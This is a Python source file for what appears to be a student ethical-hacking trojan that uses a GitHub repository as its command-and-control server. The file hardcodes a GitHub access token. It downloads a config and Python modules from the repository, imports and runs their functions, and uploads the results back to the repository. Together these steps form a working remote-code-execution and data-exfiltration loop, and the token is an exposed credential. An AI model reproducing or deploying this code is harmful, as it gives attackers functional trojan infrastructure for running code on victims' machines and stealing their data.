import sys
import os
from github import Github
import json
import importlib
import time


sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

GITHUB_TOKEN = "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"
REPO_NAME = "Abdullah-ElPsyKo/EH_Trojan_Project"
CONFIG_FILE = "config/config.json"
DATA_DIR = "data"
MODULES_DIR = "modules" 

# Initialise Github client
g = Github(GITHUB_TOKEN)
repo = g.get_repo(REPO_NAME)

# Download config file
def download_config():
    try:
        contents = repo.get_contents(CONFIG_FILE)
        config_data = json.loads(contents.decoded_content.decode())
        return config_data
    except Exception as e:
        print(f"[ERROR] error: {e}")
        return {"modules": [], "poll_interval": 60}
    
def ensure_modules_exist(config):
    if not os.path.exists(MODULES_DIR):
        os.makedirs(MODULES_DIR)
    init_file = os.path.join(MODULES_DIR, "__init__.py")
    if not os.path.exists(init_file):
        with open(init_file, "w") as f:
            f.write("")  # Create an empty __init__.py file

    required_modules = []
    for module in config.get("modules", []):
        if module.get("enabled", False):
            required_modules.append(module["name"])
    print(f"[INFO] required modules: {required_modules}")

    # Pull the required modules
    for module in required_modules:
        try:
            local_module_path = os.path.join(MODULES_DIR, f"{module}.py")
            if not os.path.exists(local_module_path):
                print(f"[INFO] pulling module: {module}")
                repo_file = repo.get_contents(f"{MODULES_DIR}/{module}.py")
                with open(local_module_path, "w") as file:
                    file.write(repo_file.decoded_content.decode())
            else:
                print(f"[INFO] module {module} already exists locally.")
        except Exception as e:
            print(f"[ERROR] failed to pull module {module}: {e}")


# Upload results to repo
def upload_results(module, results):
    file_path = f"{DATA_DIR}/{module}_results.json"
    content = json.dumps(results, indent=4)
    try:
        repo_file = repo.get_contents(file_path)
        repo.update_file(file_path, "Updated results", content, repo_file.sha)
    except:
        repo.create_file(file_path, "Created results file", content)

def execute_modules(config):
    for module in config.get("modules", []):
        module_name = module["name"]
        enabled = module.get("enabled", False)
        functions = module.get("functions", {})

        if enabled == False:
            print(f"[INFO] skipping module: {module}")
            continue

        try:
            mod = importlib.import_module(f"modules.{module_name}")
            
            results = {}
            for function_name, params in functions.items():
                func = getattr(mod, function_name, None)
                if not callable(func):
                    print(f"[ERROR] function {function_name} does not exist in the module {module_name}")
                    results[function_name] = "Function not found"
                    continue

                if isinstance(params, list):
                    results[function_name] = func(*params)
                elif isinstance(params, dict):
                    results[function_name] = func(**params)
                else: 
                    results[function_name] = func()

                print(f"[INFO] executed {function_name} from {module_name}")


            upload_results(module_name, {"status": "success", "results": results})

        except Exception as e:
            print(f"[ERROR] failed to execute {module_name}: {e}")
    
def main():
    config = download_config()
    ensure_modules_exist(config)
    execute_modules(config)
    poll_interval = config.get("poll_interval", 60)
    print(f"[INFO] Waiting {poll_interval} seconds before next execution...\n")
    time.sleep(poll_interval)


if __name__ == "__main__":
    main()